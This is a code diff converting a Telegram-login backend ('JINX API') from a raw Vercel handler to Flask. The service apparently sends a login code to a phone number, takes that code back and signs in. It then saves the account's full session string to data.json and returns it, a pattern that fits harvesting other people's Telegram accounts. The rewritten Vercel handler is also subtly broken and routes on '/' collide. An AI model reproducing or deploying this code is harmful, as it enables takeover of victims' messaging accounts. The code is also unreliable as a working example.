@@ -1,8 +1,11 @@
-# api/index.py — FLASK ASYNC (100% JALAN DI VERCEL!)
+# api/index.py — FLASK SYNC (VERCEL SERVERLESS)
 import os
 import json
-from telethon import TelegramClient
+from flask import Flask, request, jsonify
+from telethon.sync import TelegramClient
 from telethon.sessions import StringSession
+
+app = Flask(__name__)
 
 # BACA session.txt
 def get_session():
@@ -18,11 +21,9 @@ API_HASH = os.getenv('API_HASH')
 SESSION_STRING = get_session()
 
 if not all([API_ID, API_HASH, SESSION_STRING]):
-    def handler(event, context):
-        return {
-            'statusCode': 500,
-            'body': json.dumps({'error': 'ENV / session.txt RUSAK!'})
-        }
+    @app.route('/', methods=['GET', 'POST'])
+    def error():
+        return jsonify({'error': 'ENV / session.txt RUSAK!'}), 500
 
 DATA_FILE = 'data.json'
 
@@ -36,60 +37,53 @@ def save(data):
     with open(DATA_FILE, 'w') as f:
         json.dump(data, f, indent=2)
 
-async def send_code(phone):
-    try:
-        client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
-        await client.connect()
-        res = await client.send_code_request(phone)
-        await client.disconnect()
-        return {"success": True, "hash": res.phone_code_hash}
-    except Exception as e:
-        return {"success": False, "error": str(e)}
+@app.route('/', methods=['GET'])
+def home():
+    return jsonify({"message": "JINX API JALAN!"})
 
-async def login(phone, code, hash_code):
+@app.route('/send_code', methods=['POST'])
+def send_code():
+    phone = request.form.get('phone')
+    if not phone:
+        return jsonify({'success': False, 'error': 'no phone'}), 400
+
     try:
         client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
-        await client.connect()
-        await client.sign_in(phone, code=code, phone_code_hash=hash_code)
+        client.connect()
+        res = client.send_code_request(phone)
+        client.disconnect()
+        return jsonify({'success': True, 'hash': res.phone_code_hash})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/login', methods=['POST'])
+def login():
+    phone = request.form.get('phone')
+    code = request.form.get('code')
+    hash_code = request.form.get('hash')
+    if not all([phone, code, hash_code]):
+        return jsonify({'success': False, 'error': 'missing'}), 400
+
+    try:
+        client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
+        client.connect()
+        client.sign_in(phone, code=code, phone_code_hash=hash_code)
         sess = client.session.save()
         data = load()
-        data[phone] = {"session": sess}
+        data[phone] = {'session': sess}
         save(data)
-        await client.disconnect()
-        return {"success": True, "session": sess}
+        client.disconnect()
+        return jsonify({'success': True, 'session': sess})
     except Exception as e:
-        return {"success": False, "error": str(e)}
+        return jsonify({'success': False, 'error': str(e)}), 500
 
 # VERCEL HANDLER
 def handler(event, context):
-    path = event['path']
-    method = event['httpMethod']
+    from werkzeug.wrappers import Request, Response
+    from werkzeug.serving import run_simple
 
-    if path == '/' and method == 'GET':
-        return {
-            'statusCode': 200,
-            'body': json.dumps({"message": "JINX API JALAN!"})
-        }
+    @Request.application
+    def application(request):
+        return app.wsgi_app(request.environ, request.start_response)
 
-    if path == '/send_code' and method == 'POST':
-        import urllib.parse
-        phone = urllib.parse.parse_qs(event['body']).get('phone', [None])[0]
-        if not phone:
-            return {'statusCode': 400, 'body': json.dumps({'error': 'no phone'})}
-        import asyncio
-        result = asyncio.get_event_loop().run_until_complete(send_code(phone))
-        return {'statusCode': 200, 'body': json.dumps(result)}
-
-    if path == '/login' and method == 'POST':
-        import urllib.parse
-        body = urllib.parse.parse_qs(event['body'])
-        phone = body.get('phone', [None])[0]
-        code = body.get('code', [None])[0]
-        hash_code = body.get('hash', [None])[0]
-        if not all([phone, code, hash_code]):
-            return {'statusCode': 400, 'body': json.dumps({'error': 'missing'})}
-        import asyncio
-        result = asyncio.get_event_loop().run_until_complete(login(phone, code, hash_code))
-        return {'statusCode': 200, 'body': json.dumps(result)}
-
-    return {'statusCode': 404, 'body': json.dumps({'error': 'not found'})}
+    return application
